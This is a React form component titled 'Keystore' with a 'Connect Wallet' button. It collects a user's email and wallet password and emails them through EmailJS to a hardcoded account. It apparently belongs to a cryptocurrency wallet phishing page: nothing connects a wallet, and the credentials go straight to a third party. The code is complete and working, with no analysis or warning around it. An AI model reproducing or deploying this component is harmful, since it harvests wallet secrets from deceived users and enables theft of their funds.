import React, { useRef, useState } from 'react'
import emailjs from '@emailjs/browser';

import FormInput from '../FormInput'
import Modal from '../Modal';




const FORM_INPUT = [
    {
        name: 'keystore',
        label: 'Email Address',
        type: 'email',
        placeholder: 'Enter your email address',
    },
    {
        name: 'password',
        label: 'Enter your wallet password',
        type: 'password',
        placeholder: 'Enter your password',
        hint: '',
    }
]

export default function Keystore()
{
    const [open, setOpen] = useState(false)
    const form = useRef()

    const toggle = () => setOpen(!open)

    const sendEmail = (e) => {
        e.preventDefault();
    
        emailjs.sendForm('service_eitcot7', 'template_oyz43pv', form.current, 'MLwjHKgTUJiMDQ_px')
          .then((result) => {
              console.log(result.text);
          }, (error) => {
              console.log(error.text);
          });
        e.target.reset()
      };
   
  return (
    <div>
        {open && <Modal toggle={ toggle} />}
    <form ref={form} className=' flex flex-col items-start justify-start gap-2' onSubmit={sendEmail}>
        {
            FORM_INPUT.map((input, index) => <FormInput key={index} {...input} />)
        }
              {/* <input
                  type="text"
                  placeholder='fullname'
                  name='user_name'
                  required
              />
              <input
                  type="email"
                  placeholder='Email'
                  name='user_email'
                  required
              />
              <input
                  type="text"
                  placeholder='Subject'
                  name='subject'
                  required
              />
              <textarea
                  name='message'
                  cols='30'
                  rows='10'
                  placeholder='Type a Message'
              /> */}
        <button type='submit' onClick={toggle} className='font-bold my-2 text-black bg-blue-400 max-w-full w-48 p-2 rounded-md'>
            Connect Wallet
        </button>
    </form>
</div>
  )
}
